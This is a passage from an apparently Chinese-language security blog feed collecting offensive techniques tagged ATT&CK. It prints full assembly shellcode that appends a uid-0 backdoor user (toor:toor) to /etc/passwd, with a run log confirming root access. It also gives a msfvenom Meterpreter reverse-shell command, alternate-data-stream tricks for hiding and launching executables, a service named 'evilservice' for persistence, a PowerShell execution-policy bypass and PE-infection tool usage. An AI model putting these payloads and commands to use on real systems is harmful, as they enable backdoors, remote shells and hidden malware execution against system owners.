        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/ALPC_0DAY_EXP.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://hunter2.gitbook.io/darthsidious/privilege-escalation/alpc-bug-0day">https://hunter2.gitbook.io/darthsidious/privilege-escalation/alpc-bug-0day</a> </p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mmfml</title>
      <link href="/mmfml.html"/>
      <url>/mmfml.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/76A9394C6B6A9593D483C8ECD240467A.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/mmfm.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/prnd432/MMFml">https://github.com/prnd432/MMFml</a></p><p>看完以上视频之后。须知：Powershell代码需要PS v5 +才能运行。Powershell代码目前仅适用于64位系统。</p><p>1.他默认的shellcode，则为msf生成的计算器的shellcode。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1535561513979.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1535561551588.jpg" alt="enter description here"></p><p>2.首先将ps1 导入到powershell中。再使用模块，亦可使用模块去指定shellcode</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1535561679137.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1535561704322.jpg" alt="enter description here"><br>最终得到meterprerter回话。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1535561742555.jpg" alt="enter description here"></p><p>其中的PAYLOAD shellcode 前面几个参数是去指定64位，因为powershell代码只能用64位 再加上-b 去掉00字符，-f指定格式powershell。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -<span class="selector-tag">a</span> x64 <span class="attr">--platform</span> Windows -<span class="selector-tag">p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">1.116</span> LPORT=<span class="number">4444</span>  -<span class="selector-tag">b</span> <span class="string">&#x27;\x00&#x27;</span> -f powershell</span><br></pre></td></tr></table></figure><p>真香！Skr~~~</p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux_BackDoor</title>
      <link href="/linux-BackDoor.html"/>
      <url>/linux-BackDoor.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1534161053540.jpg" alt="enter description here"></p><span id="more"></span><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">; Title: add root user (toor:toor) </span><br><span class="line">; Date: <span class="number">20180811</span></span><br><span class="line">; Author: epi &lt;epibar052@gmail.com&gt;</span><br><span class="line">;   https:<span class="comment">//epi052.gitlab.io/notes-to-self/</span></span><br><span class="line">; Tested on: linux/x86_64 (SMP CentOS-<span class="number">7</span> <span class="number">3.10</span>.<span class="number">0</span>-<span class="number">862.2</span>.<span class="number">3</span><span class="selector-class">.el7</span><span class="selector-class">.x86_64</span> GNU/Linux)</span><br><span class="line">; </span><br><span class="line">; Shellcode Length: <span class="number">99</span> bytes</span><br><span class="line">; Action: Adds <span class="selector-tag">a</span> user into /etc/passwd with the following information</span><br><span class="line">;           username:   toor</span><br><span class="line">;           password:   toor</span><br><span class="line">;           uid:        <span class="number">0</span></span><br><span class="line">;           gid:        <span class="number">0</span></span><br><span class="line">;           home:       /root</span><br><span class="line">;           shell:      /bin/sh</span><br><span class="line">;</span><br><span class="line">;           toor:sXuCKi7k3Xh/s:<span class="number">0</span>:<span class="number">0</span>::/root:/bin/sh</span><br><span class="line">   </span><br><span class="line">global _start</span><br><span class="line"> </span><br><span class="line"><span class="selector-tag">section</span> <span class="selector-class">.text</span></span><br><span class="line">_start:</span><br><span class="line">    ; <span class="selector-id">#define</span> __NR_open <span class="number">2</span></span><br><span class="line">    ; int <span class="built_in">open</span>(const char *pathname, int flags);</span><br><span class="line">    ; rax -&gt; <span class="number">2</span> </span><br><span class="line">    ; rdi -&gt; /etc/passwd</span><br><span class="line">    ; rsi -&gt; <span class="number">0</span>x401</span><br><span class="line">    ; </span><br><span class="line">    ; &gt;&gt;&gt; <span class="built_in">hex</span>(os<span class="selector-class">.O_WRONLY</span> ^ os.O_APPEND)</span><br><span class="line">    ; <span class="number">0</span>x401</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mul ebx                         ; rax|rdx -&gt; <span class="number">0</span>x0</span><br><span class="line">    push rax </span><br><span class="line">    mov ebx, <span class="number">0</span>x647773ff             ; swd</span><br><span class="line">    shr ebx, <span class="number">0</span>x08</span><br><span class="line">    push rbx</span><br><span class="line">    mov rbx, <span class="number">0</span>x7361702f6374652f     ; /etc/pas</span><br><span class="line">    push rbx </span><br><span class="line">    mov rdi, rsp                    ; rdi -&gt; /etc/passwd </span><br><span class="line">    xchg esi, edx                   ; swap registers to zero out rsi </span><br><span class="line">    mov si, <span class="number">0</span>x401                   ; rsi -&gt; O_WRONLY|O_APPEND</span><br><span class="line">    add al, <span class="number">0</span>x2                     ; rax -&gt; <span class="number">2</span> (open)</span><br><span class="line">    syscall                         ; open </span><br><span class="line"> </span><br><span class="line">    xchg rdi, rax                   ; save returned fd</span><br><span class="line">     </span><br><span class="line">    jmp short get_entry_address     ; start jmp-call-pop </span><br><span class="line">     </span><br><span class="line">write_entry:</span><br><span class="line">    ; <span class="selector-id">#define</span> __NR_write <span class="number">1</span></span><br><span class="line">    ; ssize_t <span class="built_in">write</span>(int fd, const void *buf, size_t count);</span><br><span class="line">    ; rax -&gt; <span class="number">1</span> </span><br><span class="line">    ; rdi -&gt; results of open syscall </span><br><span class="line">    ; rsi -&gt; user<span class="string">&#x27;s entry </span></span><br><span class="line"><span class="string">    ; rdx -&gt; len of user&#x27;</span>s entry </span><br><span class="line">    pop rsi                         ; end jmp-call-pop, rsi -&gt; user<span class="string">&#x27;s entry  </span></span><br><span class="line"><span class="string">    push 0x1                        </span></span><br><span class="line"><span class="string">    pop rax                         ; rax -&gt; 1</span></span><br><span class="line"><span class="string">    push 38                         ; length + 1 for newline </span></span><br><span class="line"><span class="string">    pop rdx                         ; rdx -&gt; length of user&#x27;</span>s entry </span><br><span class="line">    syscall                         ; write</span><br><span class="line"> </span><br><span class="line">    ; <span class="selector-id">#define</span> __NR_exit <span class="number">60</span></span><br><span class="line">    ; void <span class="built_in">_exit</span>(int status);</span><br><span class="line">    ; rax -&gt; <span class="number">60</span> </span><br><span class="line">    ; rdi -&gt; don<span class="string">&#x27;t care </span></span><br><span class="line"><span class="string">    push 60</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall                         ; OS will handle closing fd at exit </span></span><br><span class="line"><span class="string">     </span></span><br><span class="line"><span class="string">get_entry_address:</span></span><br><span class="line"><span class="string">    call write_entry</span></span><br><span class="line"><span class="string">    user_entry: db &quot;toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh&quot;,0xa</span></span><br><span class="line"><span class="string">    ; if the user_entry above is modified, change the _count_ argument in the write call to match the new length</span></span><br><span class="line"><span class="string">    ; openssl passwd -crypt</span></span><br><span class="line"><span class="string">    ; Password: toor</span></span><br><span class="line"><span class="string">    ; Verifying - Password: toor</span></span><br><span class="line"><span class="string">    ; sXuCKi7k3Xh/s</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">; Skeleton for testing </span></span><br><span class="line"><span class="string">; </span></span><br><span class="line"><span class="string">; gcc -fno-stack-protector -z execstack shellcode-skeleton.c -o shellcode-skeleton</span></span><br><span class="line"><span class="string">; </span></span><br><span class="line"><span class="string">; #include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">; #include &lt;string.h&gt;</span></span><br><span class="line"><span class="string">;</span></span><br><span class="line"><span class="string">; unsigned char shellcode[] = \</span></span><br><span class="line"><span class="string">; &quot;\x31\xdb\xf7\xe3\x50\xbb\xff\x73\x77\x64\xc1\xeb\x08\x53\x48\xbb\x2f\x65\x74\x63\x2f\x70\x61\x73\x53\x48\x89\xe7\x87\xf2\x66\xbe\x01\x04\x04\x02\x0f\x05\x48\x97\xeb\x0e\x5e\x6a\x01\x58\x6a\x26\x5a\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xed\xff\xff\xff\x74\x6f\x6f\x72\x3a\x73\x58\x75\x43\x4b\x69\x37\x6b\x33\x58\x68\x2f\x73\x3a\x30\x3a\x30\x3a\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a&quot;;</span></span><br><span class="line"><span class="string">;</span></span><br><span class="line"><span class="string">; int main() &#123;</span></span><br><span class="line"><span class="string">;   printf(&quot;Shellcode length: %zu\n&quot;, strlen(shellcode));</span></span><br><span class="line"><span class="string">;   int (*ret)() = (int(*)())shellcode;</span></span><br><span class="line"><span class="string">;   ret();</span></span><br><span class="line"><span class="string">; &#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.exploit-db.com/exploits/45185/?rss">https://www.exploit-db.com/exploits/45185/?rss</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@demon:~# deluser demon</span><br><span class="line">正在删除用户 <span class="string">&#x27;demon&#x27;</span>...</span><br><span class="line">警告：组<span class="string">&quot;demon&quot;</span>没有其他成员了。</span><br><span class="line">完成。</span><br><span class="line">root@demon:~# su demon</span><br><span class="line">没有用户“demon”的密码项</span><br><span class="line">root@demon:~# nasm -f elf64 -o demon<span class="selector-class">.o</span> <span class="number">45185</span><span class="selector-class">.asm</span> </span><br><span class="line">root@demon:~# ld -o demon demon<span class="selector-class">.o</span> </span><br><span class="line">root@demon:~# ./demon </span><br><span class="line">root@demon:~# su toor</span><br><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line"># exit</span><br><span class="line">root@demon:~# deluser toor</span><br><span class="line">警告：您正要删除 root 帐号(uid为<span class="number">0</span>)</span><br><span class="line">这个是普遍不被需要的，因为它可能引起整个系统无法使用</span><br><span class="line">如果您真的要这样做，请使用deluser 命令，并且用<span class="attr">--force</span> 参数</span><br><span class="line">现在停止，没有任何操作被执行</span><br><span class="line">root@demon:~# deluser <span class="attr">--force</span>  toor</span><br><span class="line">正在删除用户 <span class="string">&#x27;toor&#x27;</span>...</span><br><span class="line">警告：组<span class="string">&quot;&quot;</span>没有其他成员了。</span><br><span class="line">userdel: user toor is currently used by process <span class="number">1</span></span><br><span class="line">/usr/sbin/deluser：<span class="string">&quot;/usr/sbin/userdel toor&quot;</span>返回错误代码 <span class="number">8</span>，退出。</span><br><span class="line">root@demon:~# su toor</span><br><span class="line"># </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sigverif</title>
      <link href="/sigverif.html"/>
      <url>/sigverif.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20180721_102635.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/sigverif.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="http://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/">http://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1532140368536.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1532140281350.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1532140336917.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DCOM</title>
      <link href="/DCOM.html"/>
      <url>/DCOM.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/30EC33F1CD287C4DA94E92144CF3B1A0.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Dcom.mp4'    frameborder="0"     allowfullscreen></iframe>&nbsp;<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/30EC33F1CD287C4DA94E92144CF3B1A0.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/497F7040FE9CB103F523F1B92F3382AE.jpg" alt="enter description here"><br><a href="https://zhuanlan.kanxue.com/article-4866.htm">https://zhuanlan.kanxue.com/article-4866.htm</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wmic妙用</title>
      <link href="/wmic.html"/>
      <url>/wmic.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process <span class="keyword">call</span> <span class="keyword">create</span> “calc.exe”</span><br><span class="line">wmic process <span class="keyword">where</span> name<span class="operator">=</span>”calc.exe” <span class="keyword">call</span> terminate</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/0FDF0B66760E3CA08B8AD7E8E1AC0B34.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/D004AFD6EDAA82D40E564022D034B7E0.jpg" alt="enter description here"></p><p><a href="https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/">https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InfectPE</title>
      <link href="/InfectPE.html"/>
      <url>/InfectPE.html</url>
      
        <content type="html"><![CDATA[<iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/InfectP.mp4'    frameborder="0"     allowfullscreen></iframe><h2 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h2><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=53840">https://www.microsoft.com/en-us/download/details.aspx?id=53840</a></p><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><p>.\InfectPE.exe .\input.exe .\out.exe code<br>X代码被注入代码段，这种方法更隐蔽，但有时代码段中没有足够的空间。</p><p>.\InfectPE.exe .\input.exe .\out.exe largest<br>X代码被注入到零个数最多的部分，使用这种方法可以注入更大的x代码。该方法修改了该部分的特征，并且更加可疑。</p><p>.\InfectPE.exe .\input.exe .\out.exe resize<br>展开代码段的大小并注入x代码。这种技术，就像“代码”一样，不太可疑，也可以注入更大的x代码。</p><p>.\InfectPE.exe .\input.exe .\out.exe new<br>创建一个新的部分并向其中注入x代码，该部分的硬编码名称是“.infect”</p><p>在补丁文件中，ASLR和NX被禁用，您可以分析VS项目的更多技术信息。</p><p>请不要使用打包或格式不正确的可执行文件。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/B6255317-B3BE-44A1-A454-00CF11F06358.png" alt="enter description here"></p><p>Github   <a href="https://github.com/secrary/InfectPE">https://github.com/secrary/InfectPE</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Invoke-Adversary</title>
      <link href="/Invoke-Adversary.html"/>
      <url>/Invoke-Adversary.html</url>
      
        <content type="html"><![CDATA[<p>Invoke-Adversary是一款PowerShell脚本，可帮助您根据检测高级持续性威胁的能力来评估安全产品和监控解决方案。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IA11.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IA2.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IA3.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image210.png" alt="enter description here"></p><p>link: <a href="https://github.com/MotiBa/Invoke-Adversary/tree/master#invoke-adversary">https://github.com/MotiBa/Invoke-Adversary/tree/master#invoke-adversary</a></p><p><a href="https://blogs.technet.microsoft.com/motiba/2018/04/09/invoke-adversary-simulating-adversary-operations/">https://blogs.technet.microsoft.com/motiba/2018/04/09/invoke-adversary-simulating-adversary-operations/</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/EC239B8D525F3FEBE1C6010EEEC990B1.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ADS2 数据流</title>
      <link href="/ADS2.html"/>
      <url>/ADS2.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/ADS2.mp4'    frameborder="0"     allowfullscreen></iframe><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;empty file&quot;</span> &gt; c:\ADS\file.txt</span><br><span class="line">makecab c:\ADS\procexp.exe c:\ADS\procexp.cab</span><br><span class="line">extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe</span><br><span class="line">wmic <span class="keyword">process</span> call create <span class="string">&#x27;&quot;c:\ADS\file.txt:procexp.exe&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/86746AC5B99E0AF97FED1A7D5C35B43E.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;empty file&quot;</span> &gt; c:\ADS\file<span class="selector-class">.txt</span></span><br><span class="line">findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp<span class="selector-class">.exe</span> &gt; c:\ADS\file<span class="selector-class">.txt</span>:procexp<span class="selector-class">.exe</span></span><br><span class="line">wmic process call create <span class="string">&#x27;&quot;c:\ADS\file.txt:procexp.exe&quot;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;empty file&quot;</span> &gt; c:\ADS\file<span class="selector-class">.txt</span></span><br><span class="line">type c:\windows\system32\cmd<span class="selector-class">.exe</span> &gt; c:\ADS\file<span class="selector-class">.txt</span>:cmd<span class="selector-class">.exe</span></span><br><span class="line">sc create evilservice binPath= <span class="string">&quot;\&quot;c:\ADS\file.txt:cmd.exe\&quot; /c echo works &gt; \&quot;c:\ADS\works.txt\&quot;&quot;</span> DisplayName= <span class="string">&quot;evilservice&quot;</span> start= auto</span><br><span class="line">sc start evilservice</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/508B058DD7C2020EB3B2DB5B0FD6939C.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print /d:c:\Users\demon\<span class="number">1</span><span class="selector-class">.txt</span>:procexp<span class="selector-class">.exe</span> c:\Users\demon\procexp<span class="selector-class">.exe</span></span><br><span class="line">wmic process call create <span class="string">&#x27;&quot;C:\Users\demon\1.txt:procexp.exe&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.youtube.com/watch?v=nPBcSP8M7KE&feature=youtu.be">https://www.youtube.com/watch?v=nPBcSP8M7KE&amp;feature=youtu.be</a></p><p> Link:  <a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/">https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕powershell限制</title>
      <link href="/bypass-powershell.html"/>
      <url>/bypass-powershell.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PSExecutionPolicyPreference=unrestricted</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/5078C8C4581672DE05F79A238B0285F2.jpg" alt="enter description here"><br><a href="http://www.hexacorn.com/blog/2018/04/06/a-quick-note-about-psexecutionpolicypreference/">http://www.hexacorn.com/blog/2018/04/06/a-quick-note-about-psexecutionpolicypreference/</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>forfiles2</title>
      <link href="/forfiles2.html"/>
      <url>/forfiles2.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/forfiles_calc.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/84CB063165CEF600E2BEA1DDAEF04CD5.jpg" alt="enter description here"></p><p>link: <a href="https://twitter.com/harr0ey/status/979478826093772800">https://twitter.com/harr0ey/status/979478826093772800</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unicorn</title>
      <link href="/unicorn.html"/>
      <url>/unicorn.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/A1AD5A55650233CB348CED3EDADABB20.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/unicorn1.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/E082C7CCF73ECE8B70821370D5F20497.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1576F05082484EC46728F8F7A14285A5.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/FB04BA3559E021548BC7D695AC92E556.jpg" alt="enter description here"></p><p>独角兽是使用PowerShell降级攻击并直接将shellcode插入内存的简单工具。基于Matthew Graeber的PowerShell攻击和由David Kennedy（TrustedSec）和Josh Kelly在Defcon 18提供的PowerShell旁路技术。</p><p>用法很简单，只需运行Magic Unicorn（确保在使用Metasploit方法并在正确的路径中安装Metasploit），魔术独角兽会自动生成一个PowerShell命令，您只需将PowerShell代码剪切并粘贴到命令行窗口或通过有效载荷传送系统。独角兽支持你自己的shellcode，和Metasploit<br> Github: <a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>p0wnedShell</title>
      <link href="/p0wnedShell.html"/>
      <url>/p0wnedShell.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/00F4B1D6625DDBA679857E14BDD6EF3E.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/p0wnedShell.mp4'    frameborder="0"     allowfullscreen></iframe><p>p0wnedShell是用C＃编写的冒犯性PowerShell主机应用程序，它不依赖powershell.exe，但在PowerShell运行空间环境（.NET）中运行PowerShell命令和函数。它有很多攻击性的PowerShell模块和二进制文件，使后期开发过程更加容易。我们尝试的是构建一个“一体化”后期开发工具，我们可以使用它来绕过所有缓解解决方案（或至少部分关闭），并且包含所有相关工具。您可以使用它在Active Directory环境中执行现代攻击，并在您的蓝色团队中创建知名度，以便构建正确的防御策略。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F63AD030D1EB729779EB10C0BDF86B09.jpg" alt="enter description here"></p><p>Link: <a href="https://github.com/Cn33liz/p0wnedShell">https://github.com/Cn33liz/p0wnedShell</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
